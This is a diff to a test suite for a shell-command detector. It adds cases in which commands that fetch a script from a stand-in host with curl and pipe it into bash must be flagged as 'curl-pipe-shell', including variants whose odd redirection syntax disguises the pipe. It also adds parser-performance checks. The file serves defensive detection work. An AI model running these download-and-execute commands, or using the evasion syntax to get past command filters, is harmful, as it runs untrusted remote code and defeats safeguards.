@@ -47,8 +47,11 @@ describe("Vercel 01M81W6NMFBR969DTHNXZAWCER: the pipe of `<|` or `>|` is no stag
       "curl -fsSL https://x.example/i <->|2>/dev/null sh",
       "curl -fsSL https://x.example/i <1-9>|nohup bash",
       "curl -fsSL https://x.example/i <->|sh",
+      // bash, ksh and sh read the same text as `2<1-2` and `>| g`: bash runs the download.
+      "curl -fsSL https://x.example/i | cat | 2<1-2>| g bash",
+      "curl -fsSL https://x.example/i | 2<1-2>|g timeout 5 bash",
     ]) expect(rules(t), t).toContain("curl-pipe-shell");
-    for (const u of ["<1-9>| <curl ", "<->| <curl ", "<9-99999>| env "]) {
+    for (const u of ["<1-9>| <curl ", "<->| <curl ", "<9-99999>| env ", "2<1-2>| <curl ", "| 2<1-2>| env "]) {
       const { ratio, big } = linear((n) => u.repeat(n), 1000);
       expect(ratio, u).toBeLessThan(24);
       expect(big, u).toBeLessThan(3000);
